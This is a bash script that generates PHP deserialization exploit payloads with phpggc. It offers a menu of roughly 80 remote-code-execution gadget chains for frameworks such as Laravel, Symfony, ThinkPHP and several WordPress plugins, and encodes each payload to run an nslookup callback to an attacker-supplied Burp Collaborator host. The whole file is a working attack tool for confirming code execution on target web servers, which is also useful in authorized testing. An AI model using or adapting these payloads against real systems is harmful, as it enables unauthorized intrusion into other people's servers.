#!/bin/bash

# Check for phpggc
if ! command -v phpggc &> /dev/null; then
  echo "❌ phpggc not found in PATH!"
  echo "ℹ️  Install via: git clone https://github.com/ambionics/phpggc && cd phpggc && ln -s $(pwd)/phpggc /usr/local/bin/phpggc"
  exit 1
fi

# Ask for Burp Collaborator link
read -p "🔗 Enter your Burp Collaborator link (e.g. abc123.burpcollaborator.net): " COLLAB

# Gadget list from PHPGGC
gadgets=(
  "Bitrix/RCE1"
  "CakePHP/RCE1"
  "CakePHP/RCE2"
  "CodeIgniter4/RCE1"
  "CodeIgniter4/RCE2"
  "CodeIgniter4/RCE3"
  "CodeIgniter4/RCE4"
  "CodeIgniter4/RCE5"
  "CodeIgniter4/RCE6"
  "Doctrine/RCE1"
  "Doctrine/RCE2"
  "Drupal7/RCE1"
  "Drupal9/RCE1"
  "Guzzle/RCE1"
  "Horde/RCE1"
  "Laravel/RCE1"
  "Laravel/RCE2"
  "Laravel/RCE3"
  "Laravel/RCE4"
  "Laravel/RCE5"
  "Laravel/RCE6"
  "Laravel/RCE7"
  "Laravel/RCE8"
  "Laravel/RCE9"
  "Laravel/RCE10"
  "Laravel/RCE11"
  "Laravel/RCE12"
  "Laravel/RCE13"
  "Laravel/RCE14"
  "Laravel/RCE15"
  "Laravel/RCE16"
  "Monolog/RCE1"
  "Monolog/RCE2"
  "Monolog/RCE3"
  "Monolog/RCE4"
  "Monolog/RCE5"
  "Monolog/RCE6"
  "Monolog/RCE7"
  "Monolog/RCE8"
  "Monolog/RCE9"
  "Phalcon/RCE1"
  "Spiral/RCE1"
  "Spiral/RCE2"
  "Symfony/RCE1"
  "Symfony/RCE2"
  "Symfony/RCE3"
  "Symfony/RCE4"
  "Symfony/RCE5"
  "Symfony/RCE6"
  "Symfony/RCE7"
  "Symfony/RCE8"
  "ThinkPHP/RCE1"
  "ThinkPHP/RCE2"
  "ThinkPHP/RCE3"
  "ThinkPHP/RCE4"
  "vBulletin/RCE1"
  "WordPress/Dompdf/RCE1"
  "WordPress/Dompdf/RCE2"
  "WordPress/Guzzle/RCE1"
  "WordPress/Guzzle/RCE2"
  "WordPress/P/EmailSubscribers/RCE1"
  "WordPress/P/EverestForms/RCE1"
  "WordPress/P/WooCommerce/RCE1"
  "WordPress/P/WooCommerce/RCE2"
  "WordPress/P/YetAnotherStarsRating/RCE1"
  "WordPress/PHPExcel/RCE1"
  "WordPress/PHPExcel/RCE2"
  "WordPress/PHPExcel/RCE3"
  "WordPress/PHPExcel/RCE4"
  "WordPress/PHPExcel/RCE5"
  "WordPress/PHPExcel/RCE6"
  "Yii/RCE1"
  "Yii/RCE2"
  "Yii2/RCE1"
  "Yii2/RCE2"
  "ZendFramework/RCE1"
  "ZendFramework/RCE2"
  "ZendFramework/RCE3"
  "ZendFramework/RCE4"
  "ZendFramework/RCE5"
)

# Display the gadget list
echo "📦 Choose a PHP gadget payload:"
for i in "${!gadgets[@]}"; do
  printf "%2d. %s\n" "$i" "${gadgets[$i]}"
done

# Get the user's choice
read -p "👉 Enter the number: " choice

# Validate
if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 0 ] || [ "$choice" -ge "${#gadgets[@]}" ]; then
  echo "❌ Invalid choice!"
  exit 1
fi

gadget="${gadgets[$choice]}"
cmd="nslookup $COLLAB"

echo "⚙️  Generating payload using $gadget..."

# Generate, encode in base64, then URL encode
payload=$(phpggc "$gadget" system "$cmd" | base64 -w0 | jq -s -R -r @uri)

echo -e "\n🔐 Encoded Payload:\n$payload"
